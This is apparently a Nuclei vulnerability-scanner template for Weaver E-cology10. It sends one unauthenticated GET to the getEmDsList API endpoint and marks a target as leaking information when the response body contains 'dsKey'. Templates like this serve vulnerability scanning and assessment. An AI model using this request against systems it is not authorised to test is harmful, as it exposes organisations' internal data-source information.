id: fanwei-E-cology10-getEmDsList-unauth

info:
  name: 泛微E-cology10 getEmDsList 存在信息泄露漏洞
  author: AYAQ
  severity: medium
  tags: E-cology10,fanwei,unauth

http:
  - raw:
      - |
        GET /papi/em/transform/getEmDsList HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/601.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/601.1.15

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"dsKey")'
      - type: status
        status:
          - 200
